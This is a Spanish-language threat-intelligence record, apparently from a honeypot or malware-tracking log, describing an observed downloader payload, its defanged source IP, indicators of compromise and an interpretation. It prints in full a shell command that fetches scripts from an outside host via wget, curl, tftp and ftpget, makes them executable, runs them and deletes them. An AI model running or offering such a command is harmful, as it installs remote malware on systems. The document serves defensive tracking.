# Payload detectado: 58cb78ad14379bb5becf2022b647d1892ad3e9376f03b25fa60bfcfee95f19e5

## Tipo

Downloader shell payload.

## Comando observado

```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
wget hxxp://91[.]92[.]42[.]213/phantom.sh;
curl -O hxxp://91[.]92[.]42[.]213/phantom.sh;
chmod 777 phantom.sh;
sh phantom.sh;
tftp 91[.]92[.]42[.]213 -c get phantom.sh;
chmod 777 phantom.sh;
sh phantom.sh;
tftp -r phantom2.sh -g 91[.]92[.]42[.]213;
chmod 777 phantom2.sh;
sh phantom2.sh;
ftpget -v -u anonymous -p anonymous -P 21 91[.]92[.]42[.]213 phantom1.sh phantom1.sh;
sh phantom1.sh;
rm -rf phantom.sh phantom2.sh phantom1.sh;
```

## IOCs

| Tipo | Valor |
|---|---|
| IP | `91[.]92[.]42[.]213` |
| Archivo | `phantom.sh` |
| Archivo | `phantom2.sh` |
| Archivo | `phantom1.sh` |
| Protocolo | HTTP |
| Protocolo | TFTP |
| Protocolo | FTP |

## Artefactos descargados o intentados

| Artefacto | Estado | Malware relacionado |
|---|---|---|
| `phantom.sh` | observado, pendiente de captura | pendiente |
| `phantom2.sh` | observado, pendiente de captura | pendiente |
| `phantom1.sh` | observado, pendiente de captura | pendiente |

## Interpretación

El payload intenta cambiar a un directorio escribible, descargar scripts desde `91[.]92[.]42[.]213`, dar permisos de ejecución y correrlos.

Usa varios métodos de descarga para aumentar probabilidad de éxito:

- `wget`
- `curl`
- `tftp`
- `ftpget`

Si alguno de los scripts es capturado por safe-fetch, debe publicarse en `malware/confirmados/` y este payload debe enlazarlo.

## Estado

Payload observado y firmado. No implica por sí solo malware confirmado.
